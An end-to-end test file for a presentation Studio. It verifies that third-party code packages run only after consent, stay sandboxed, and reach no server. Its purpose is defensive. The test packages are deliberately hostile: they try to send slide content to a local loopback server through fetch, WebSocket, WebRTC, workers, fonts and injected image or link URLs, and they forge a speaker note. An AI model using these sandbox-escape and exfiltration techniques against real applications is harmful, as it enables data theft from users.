import dgram from 'node:dgram';
import http from 'node:http';
import JSZip from 'jszip';
import { WORKER_NETWORK } from '../../lib/packages/code-shape.mjs';
import { expect, gotoStudio, livePreview, setEditorContent, test } from './studio-fixture';

// ── A code package runs in the Studio only after consent, and reaches nothing (contract note §9) ──
//
// A third-party code package (a component whose `transform.js` someone else wrote) is imported
// through the REAL Library, used by a deck, and approved from the notice above the preview. It is
// hostile: at load and on every slide its code tries fetch, a WebSocket, `importScripts`, a dynamic
// `import()`, an EventSource, a font load (`FontFace` and `self.fonts`), `fetch` taken from the
// global's prototype, a nested worker, WebRTC to a UDP port, and a navigation, and the
// section it returns names a local server seven ways and forges a speaker note. A REAL loopback
// HTTP + WebSocket server and a UDP socket count what reaches them (HARD RULE #23: a network log,
// not a claim about a string). The CONTROLS show the log can see: the same Studio page reaches the
// HTTP server (an authored image, after "Load them") and the UDP socket (WebRTC from the page).
//
//   1. UNAPPROVED — the slide shows the engine's own content and a note; the notice offers the
//      code; the log is empty.
//   2. APPROVED — the package draws; the log is still empty; the preview holds no reference to the
//      server, no forged note, and the package ran in a sandboxed frame with an opaque origin.
//   3. CONTROLS — the page itself reaches both listeners.
//
// A second test runs a package written against `slide.facts` ONLY (lib/packages/slide-facts.mjs,
// the stable input): it never reads `slide.html`, draws a dated list from the facts, and tries to
// send them out. It draws from the plain text, and the log stays empty.

test.describe.configure({ timeout: 300_000 });

const tallyCode = (origin: string, udp: number) => `
try { fetch("${origin}/load-fetch").catch(function(){}); } catch (e) {}
try { importScripts("${origin}/load-import"); } catch (e) {}
function tally(slide, kit) {
  try { fetch("${origin}/fetch").catch(function(){}); } catch (e) {}
  try { new WebSocket("${origin.replace('http', 'ws')}/websocket"); } catch (e) {}
  try { import("${origin}/dynimport").catch(function(){}); } catch (e) {}
  try { new EventSource("${origin}/eventsource"); } catch (e) {}
  try { var ff = new FontFace("x", "url(${origin}/fontface)"); ff.load().catch(function(){}); self.fonts.add(ff); } catch (e) {}
  try { for (var o = self; o; o = Object.getPrototypeOf(o)) { var d = Object.getOwnPropertyDescriptor(o, "fonts"); if (d && d.get) d.get.call(self).load("12px x").catch(function(){}); if (typeof o.fetch === "function") o.fetch.call(self, "${origin}/protofetch").catch(function(){}); } } catch (e) {}
  try { new Worker(URL.createObjectURL(new Blob(["fetch('${origin}/nested').catch(function(){})"]))); } catch (e) {}
  try { var pc = new (self.RTCPeerConnection || self.webkitRTCPeerConnection)({ iceServers: [{ urls: "stun:127.0.0.1:${udp}" }] }); pc.createDataChannel("x"); pc.createOffer().then(function (o) { return pc.setLocalDescription(o); }); } catch (e) {}
  try { self.location.href = "${origin}/navigate"; } catch (e) {}
  // The second wall as this engine sees it: each network name still reachable anywhere on the
  // global's prototype chain (lib/packages/code-shape.mjs WORKER_NETWORK). It must be none.
  var reach = [];
  ${JSON.stringify(WORKER_NETWORK)}.forEach(function (k) {
    for (var o = self; o; o = Object.getPrototypeOf(o)) { var d = Object.getOwnPropertyDescriptor(o, k); if (d && (d.get || d.value != null)) { reach.push(k); break; } }
  });
  // kit.measure without \`self.fonts\`: the canvas still measures text on this engine.
  var measured = kit.measure("Wide text", "16px sans-serif") > kit.measure("i", "16px sans-serif") ? "yes" : "no";
  var n = Number((/<li>(\\d+)<\\/li>/.exec(slide.html) || [])[1] || 0);
  var marks = "";
  for (var i = 0; i < n; i++) marks += '<span class="tally-mark">' + (i + 1) + "</span>";
  var hostile = '<img src="${origin}/img" alt=""><img srcset="${origin}/srcset 1x" alt=""><video poster="${origin}/poster"></video>' +
    '<svg width="4" height="4"><image href="${origin}/svgimage" width="4" height="4"></image></svg>' +
    '<span style="background-image:url(${origin}/cssurl)">x</span><a href="${origin}/link">link</a>' +
    '<aside class="lattice-notes" hidden data-slide="1">FORGED-NOTE</aside>';
  return "\\n" + slide.html.replace(/<ul>[\\s\\S]*?<\\/ul>/, '<div class="tally-marks" data-count="' + n + '" data-rtc="' + typeof (self.RTCPeerConnection || self.webkitRTCPeerConnection) + '" data-wall="' + (reach.join(" ") || "none") + '" data-measure="' + measured + '">' + marks + "</div>" + hostile) + "\\n";
}
export { tally as default };
`;

async function tallyZip(code: string): Promise<Buffer> {
	const zip = new JSZip();
	zip.file('tally/tally.manifest.json', JSON.stringify({ name: 'tally', type: 'component', format: 1, facts: 1 }));
	zip.file('tally/tally.styles.css', 'section.tally .tally-marks { display: flex; gap: 0.5em; color: var(--accent); }\n');
	zip.file('tally/tally.gallery.md', '<!-- _class: tally -->\n\n## Tally\n\n- 3\n');
	zip.file('tally/tally.transform.js', code);
	return zip.generateAsync({ type: 'nodebuffer' });
}

async function openLibrary(page: Parameters<typeof gotoStudio>[0]) {
	const docked = page.getByRole('button', { name: 'Open Library' });
	await ((await docked.count()) ? docked : page.getByRole('button', { name: 'Library', exact: true })).click();
}

// All three engines: a blob Worker inside an opaque-origin sandboxed frame is exactly the kind of
// thing engines disagree on. `@gecko` runs on the desktop (Chromium) project and the gecko one; the
// `@webkit-tablet` twin runs on WebKit (the desktop project skips a title naming @webkit).
for (const tag of [' @gecko', ' @webkit-tablet']) {
test(`a code package runs in the Studio only after consent, sandboxed, and reaches nothing${tag}`, async ({ page, browserName }) => {
		const hits: string[] = [];
		const server = http.createServer((req, res) => {
			hits.push(req.url || '');
			res.writeHead(200, { 'Content-Type': 'image/png', 'Access-Control-Allow-Origin': '*' });
			res.end();
		});
		server.on('upgrade', (req, sock) => {
			hits.push(req.url || '');
			sock.destroy();
		});
		await new Promise<void>((r) => server.listen(0, '127.0.0.1', () => r()));
		const origin = `http://127.0.0.1:${(server.address() as { port: number }).port}`;
		const udpHits: string[] = [];
		const udp = dgram.createSocket('udp4');
		udp.on('message', () => udpHits.push('udp'));
		await new Promise<void>((r) => udp.bind(0, '127.0.0.1', () => r()));
		const udpPort = udp.address().port;
		const settle = () => page.waitForTimeout(2500);

		try {
			await gotoStudio(page);
			await openLibrary(page);
			await page.locator('input[type="file"][accept=".zip"]').setInputFiles({ name: 'tally.zip', mimeType: 'application/zip', buffer: await tallyZip(tallyCode(origin, udpPort)) });
			await expect(page.locator('[data-sonner-toast]').first()).toContainText('1 component(s)');
			await page.keyboard.press('Escape');

			const deck = '<!-- _class: tally -->\n\n## Three wins\n\n- 3\n\n<!-- the author note -->\n';
			await setEditorContent(page, deck);
			const preview = livePreview(page);
			const notice = page.locator('[data-slot="code-packages"]');

			// 1. UNAPPROVED.
			await expect(notice).toHaveAttribute('data-state', 'unapproved', { timeout: 30_000 });
			await expect(notice).toContainText('This deck uses code from the component “tally”, which has not run.');
			await notice.getByRole('button', { name: 'What it is' }).click();
			await expect(page.locator('[data-slot="code-packages-detail"]')).toContainText(/tally\.transform\.js, [\d,]+ bytes, sha256 [0-9a-f]{64}/);
			await expect(preview.locator('[data-package-error="tally"]')).toContainText('its code has not been approved in this browser');
			await expect(preview.locator('.tally-marks')).toHaveCount(0);
			await expect(page.locator('iframe[data-lattice-code-sandbox]')).toHaveCount(0);
			await settle();
			expect(hits, `the unapproved package reached the server: ${hits.join(', ')}`).toEqual([]);
			expect(udpHits).toEqual([]);

			// 2. APPROVED. Each render opens the package's frame and closes it when it ends, so the frame
			// is watched as it appears rather than looked for afterwards.
			await page.evaluate(() => {
				const w = window as unknown as { __sandboxes: string[] };
				w.__sandboxes = [];
				new MutationObserver((records) => {
					for (const r of records) for (const n of r.addedNodes) if (n instanceof HTMLIFrameElement && n.hasAttribute('data-lattice-code-sandbox')) w.__sandboxes.push(String(n.getAttribute('sandbox')));
				}).observe(document.body, { childList: true, subtree: true });
			});
			await notice.getByRole('button', { name: 'Run the code of tally' }).click();
			await expect(preview.locator('.tally-marks[data-count="3"] .tally-mark')).toHaveCount(3, { timeout: 30_000 });
			await expect(notice).toHaveCount(0);
			// The package reports from INSIDE its worker whether WebRTC exists there at all. It must not:
			// on Gecko the UDP control below cannot fire, so this is what the UDP zero rests on there.
			await expect(preview.locator('.tally-marks')).toHaveAttribute('data-rtc', 'undefined');
			// And no network name survives the second wall on this engine, on `self` or its prototypes.
			await expect(preview.locator('.tally-marks')).toHaveAttribute('data-wall', 'none');
			await expect(preview.locator('.tally-marks')).toHaveAttribute('data-measure', 'yes');
			const sandboxes = await page.evaluate(() => (window as unknown as { __sandboxes: string[] }).__sandboxes);
			expect(sandboxes.length, 'the package ran in a sandbox frame').toBeGreaterThan(0);
			expect(new Set(sandboxes)).toEqual(new Set(['allow-scripts']));
			// Closed once its render ended: no frame outlives the render that needed it.
			await expect(page.locator('iframe[data-lattice-code-sandbox]')).toHaveCount(0);
			await settle();
			test.info().annotations.push({ type: 'log-server', description: `${test.info().project.name}: ${hits.length} requests, ${udpHits.length} UDP packets after the approved run` });
			expect(hits, `the approved package reached the server: ${hits.join(', ')}`).toEqual([]);
			expect(udpHits, 'the approved package reached the UDP socket (WebRTC)').toEqual([]);
			const shown = await preview.locator('section').first().evaluate((s) => s.outerHTML);
			expect(shown).not.toContain(origin.replace('http://', ''));
			expect(shown).not.toMatch(/class="lattice-notes"[^>]*>[^<]*FORGED-NOTE/);
			expect(shown).toMatch(/<img alt="">/);
			const evidence = process.env.LATTICE_EVIDENCE_DIR;
			if (evidence) await preview.locator('section').first().screenshot({ path: `${evidence}/code-package-approved.png` });

			// 3. CONTROLS: the same page reaches both listeners, so the empty logs above are refusals.
			// Firefox's CI build gathers no loopback candidates for the page's own WebRTC, even with
			// `media.peerconnection.ice.loopback` (two nightly runs), so on Gecko this control cannot
			// see and is skipped, and the UDP zero there rests on the worker having no WebRTC at all,
			// which the package's own `data-rtc` report above measured.
			if (browserName === 'firefox') {
				test.info().annotations.push({ type: 'gecko-udp', description: 'Gecko: no working page-side UDP control; the UDP zero rests on the measured absence of WebRTC in the worker' });
			} else {
				await page.evaluate(
					async ({ udpPort }) => {
						const pc = new RTCPeerConnection({ iceServers: [{ urls: `stun:127.0.0.1:${udpPort}` }] });
						pc.createDataChannel('x');
						await pc.setLocalDescription(await pc.createOffer());
					},
					{ udpPort },
				);
				await expect.poll(() => udpHits.length, { timeout: 15_000 }).toBeGreaterThan(0);
			}
			await setEditorContent(page, `<!-- _class: tally -->\n\n## Three wins\n\n- 3\n\n![control](${origin}/control.png)\n`);
			const web = page.locator('[data-slot="web-images"]');
			await expect(web).toHaveAttribute('data-state', 'blocked', { timeout: 30_000 });
			await web.getByRole('button', { name: /^Load \d+ images? from/ }).click();
			await expect.poll(() => hits.filter((h) => h === '/control.png').length, { timeout: 30_000 }).toBeGreaterThan(0);
			expect(hits.filter((h) => h !== '/control.png'), 'only the control reached the server').toEqual([]);
		} finally {
			// `close()` waits for every open connection, and the browser can still hold one to this
			// server (an image it loaded): the nightly's first desktop run spent 290 s here after every
			// step had passed, then timed out. End them first.
			server.closeAllConnections();
			await new Promise((r) => server.close(() => r(null)));
			udp.close();
		}
	});
}

// ── A package that reads only slide.facts draws in the Studio, and reaches nothing ──
const datelineCode = (origin: string) => `
function dateline(slide) {
  var f = slide.facts;
  try { fetch("${origin}/facts?d=" + encodeURIComponent(f.text)).catch(function(){}); } catch (e) {}
  var list = f.blocks.find(function (b) { return b.type === "list"; });
  var frozen = true;
  try { f.blocks.push({}); frozen = false; } catch (e) {}
  var esc = function (s) { return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;"); };
  var rows = (list ? list.items : []).map(function (it) {
    var m = /^(\\d{4}-\\d{2}-\\d{2})\\s+(.*)$/.exec(it.text) || [null, "", it.text];
    return '<li class="dateline-row"><b class="dateline-date">' + esc(m[1]) + "</b> " + esc(m[2]) + "</li>";
  }).join("");
  var paint = f.tokens.indexOf("--cat-1-mark") >= 0 ? "var(--cat-1-mark)" : "currentColor";
  return '<section class="' + f.classes.join(" ") + ' dateline-drawn"><h2>' + esc(f.title) + '</h2><ol class="dateline-rows" style="color:' + paint + '">' + rows + "</ol><p class=\\"dateline-meta\\">facts v" + f.version + ", frozen " + frozen + "</p></section>";
}
export { dateline as default };
`;

for (const tag of [' @gecko', ' @webkit-tablet']) {
	test(`a code package that reads only slide.facts draws in the Studio, and reaches nothing${tag}`, async ({ page }) => {
		const hits: string[] = [];
		const server = http.createServer((req, res) => {
			hits.push(req.url || '');
			res.writeHead(200, { 'Access-Control-Allow-Origin': '*' });
			res.end();
		});
		await new Promise<void>((r) => server.listen(0, '127.0.0.1', () => r()));
		const origin = `http://127.0.0.1:${(server.address() as { port: number }).port}`;
		try {
			await gotoStudio(page);
			await openLibrary(page);
			const zip = new JSZip();
			zip.file('dateline/dateline.manifest.json', JSON.stringify({ name: 'dateline', type: 'component', format: 1, facts: 1 }));
			zip.file('dateline/dateline.styles.css', 'section.dateline .dateline-rows { display: grid; gap: 0.25em; }\n');
			zip.file('dateline/dateline.gallery.md', '<!-- _class: dateline -->\n\n## Plan\n\n- 2026-01-10 Kickoff\n');
			zip.file('dateline/dateline.transform.js', datelineCode(origin));
			await page.locator('input[type="file"][accept=".zip"]').setInputFiles({ name: 'dateline.zip', mimeType: 'application/zip', buffer: await zip.generateAsync({ type: 'nodebuffer' }) });
			await expect(page.locator('[data-sonner-toast]').first()).toContainText('1 component(s)');
			await page.keyboard.press('Escape');
			await setEditorContent(page, '<!-- _class: dateline -->\n\n## Launch plan\n\n- 2026-01-10 **Kickoff**\n- 2026-03-02 Beta & pilot\n- 2026-06-30 [General availability](https://example.test)\n');
			const notice = page.locator('[data-slot="code-packages"]');
			await expect(notice).toHaveAttribute('data-state', 'unapproved', { timeout: 30_000 });
			await notice.getByRole('button', { name: 'Run the code of dateline' }).click();
			const preview = livePreview(page);
			const rows = preview.locator('.dateline-rows .dateline-row');
			await expect(rows).toHaveCount(3, { timeout: 30_000 });
			await expect(rows.nth(0)).toHaveText('2026-01-10 Kickoff');
			await expect(rows.nth(1)).toHaveText('2026-03-02 Beta & pilot');
			await expect(rows.nth(2)).toHaveText('2026-06-30 General availability');
			await expect(preview.locator('.dateline-meta')).toHaveText('facts v1, frozen true');
			await expect(preview.locator('.dateline-rows')).toHaveAttribute('style', 'color:var(--cat-1-mark)');
			// The engine's classes, which a package drawing from facts cannot know, are put back by the door.
			await expect(preview.locator('section.dateline.dateline-drawn.content')).toHaveCount(1);
			const evidence = process.env.LATTICE_EVIDENCE_DIR;
			if (evidence) await preview.locator('section').first().screenshot({ path: `${evidence}/code-package-facts.png` });
			await page.waitForTimeout(2500);
			expect(hits, `the facts package reached the server: ${hits.join(', ')}`).toEqual([]);
		} finally {
			server.closeAllConnections();
			await new Promise((r) => server.close(() => r(null)));
		}
	});
}
